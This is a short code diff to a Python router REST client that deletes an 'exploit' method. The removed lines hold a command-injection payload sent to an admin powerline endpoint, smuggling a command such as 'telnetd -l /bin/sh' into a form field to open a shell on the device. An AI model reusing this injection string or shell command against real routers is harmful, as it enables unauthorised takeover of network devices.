@@ -162,15 +162,7 @@ class RouterRestClient:
 		data = self.apiCall("reboot", "reboot")
 
 
-	def exploit(target, password, cmd):
-		print("[+] Sending exploit. This will take a some seconds, please be patient!")
-		if send_encrypted_request("/admin/powerline?form=plc_device", "operation=remove&key=1234; {} #".format(cmd)
-								  ):
-			print("[+] Exploit executed successfully")
-			if cmd == "telnetd -l /bin/sh":
-				print("[+] Now you can connect to the device with the following command:\n    telnet {}".format(target))
-		else:
-			print("[!] Failed to execute exploit")
+	
 
 
 
